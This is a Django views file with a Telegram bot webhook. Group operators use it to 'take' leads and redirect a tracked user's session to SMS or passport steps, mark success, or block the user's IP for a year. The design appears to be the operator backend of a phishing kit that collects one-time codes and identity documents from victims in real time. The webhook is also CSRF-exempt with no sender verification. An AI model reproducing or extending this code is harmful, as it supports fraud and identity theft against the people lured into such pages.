import logging
import json
from datetime import timedelta

import blacklist.models
from django.http import HttpResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from telegram import Bot

from config.settings import DEFAULT_BLOCK_TIME
from .bot import *
from web_site.helpers import *


# Create your views here.
from .models import ProcessedLead

logger = logging.getLogger(__name__)


@csrf_exempt
async def webhook(request):
    if request.method == 'POST':
        # Data is request from Telegram API in JSON format
        data = json.loads(request.body)
        logger.info(f"TG bot log - {data}")
        print(f"TG bot log - {data}")

        if 'message' in data:
            # For handling simple messages
            pass
        elif 'callback_query' in data:
            callback = data["callback_query"]["data"]
            callback_type = callback.split("_")[0]
            user_id = callback.split("_")[1]

            is_taken = False
            if "sms" in callback:
                write_to_storage_data(user_id, "sms")
            elif "passport" in callback:
                write_to_storage_data(user_id, "passport")
            elif "ban" in callback:
                if len(callback.split("_")) > 2:
                    user_ip = callback.split("_")[2]

                    await blacklist.models.Rule.objects.acreate(
                        duration=timedelta(days=365),
                        address=user_ip
                    )

                write_to_storage_data(user_id, "reload")

            elif "success" in callback:
                write_to_storage_data(user_id, "success")
            elif "take" in callback:
                lead_id = callback.split("_")[1]
                lead_owner = data["callback_query"]["from"]["username"]

                await ProcessedLead.objects.acreate(
                    lead_id=lead_id,
                    lead_owner=lead_owner
                )
                is_taken = True

            helper = BotHelper(user_id)
            bot_data = await helper.get_bot()
            keyboard = helper.keyboard(request, user_id, "", True)
            bot = Bot(token=bot_data.token)

            if is_taken:
                message = f'{data["callback_query"]["message"]["text"]}\n\n ℹВзяв {lead_owner}'
            else:
                message = f'{data["callback_query"]["message"]["text"]}\nРедирект на {callback_type}'
            try:
                await bot.edit_message_text(
                    message_id=data["callback_query"]["message"]["message_id"],
                    chat_id=bot_data.group_id,
                    text=message,
                    reply_markup=keyboard
                )
            except Exception as e:
                logger.info("Message not modified")

    return HttpResponse(status=200)
